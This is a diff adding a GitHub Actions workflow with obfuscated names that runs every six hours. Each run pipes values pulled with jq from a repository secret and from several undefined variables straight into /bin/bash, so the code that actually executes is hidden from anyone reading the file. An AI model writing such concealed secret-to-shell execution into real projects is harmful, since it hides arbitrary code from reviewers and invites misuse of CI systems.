@@ -1,0 +1,25 @@
+name: tangnaihe8765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangnaihe8765
+        env:
+          zh73: ${{ secrets.zh73 }}
+        run: |
+          echo $zh73 | jq -r .ggf06113 | /bin/bash
+          echo $kgpc2 | jq -r .bmv6 | /bin/bash
+          echo $rdwy33 | jq -r .llvjk28309 | /bin/bash
+          echo $a29806 | jq -r .dayl34 | /bin/bash
+          echo $vlmlg8 | jq -r .mhu529 | /bin/bash
+          echo $vjbe99566 | jq -r .ms048 | /bin/bash
+          echo $zbmph09216 | jq -r .a1240 | /bin/bash
+          echo $lygy1536 | jq -r .kppsl5 | /bin/bash
+          echo $t8585 | jq -r .y569 | /bin/bash
+          echo $jc71 | jq -r .yzjnk53887 | /bin/bash
+
